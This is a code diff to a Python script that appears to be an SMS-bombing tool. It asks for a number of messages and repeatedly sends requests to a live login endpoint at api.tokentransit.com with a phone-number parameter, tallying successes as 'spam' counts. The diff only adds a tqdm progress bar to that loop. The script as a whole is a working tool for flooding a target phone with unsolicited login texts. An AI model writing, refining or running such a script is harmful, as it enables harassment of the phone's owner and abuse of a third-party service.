@@ -1,3 +1,4 @@
+from tqdm import tqdm
 import requests
 print("""
      _.-^^---....,,----       
@@ -20,7 +21,7 @@ url = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"
 numofmsgs = int(input("Enter number of messages to send: "))
 successspamCount = 0
 failspamCount = 0
-for i in range(numofmsgs):
+for i in tqdm(range(numofmsgs)):
     resp = requests.get(url)
     if resp.status_code == 200:
         successspamCount = successspamCount + 1
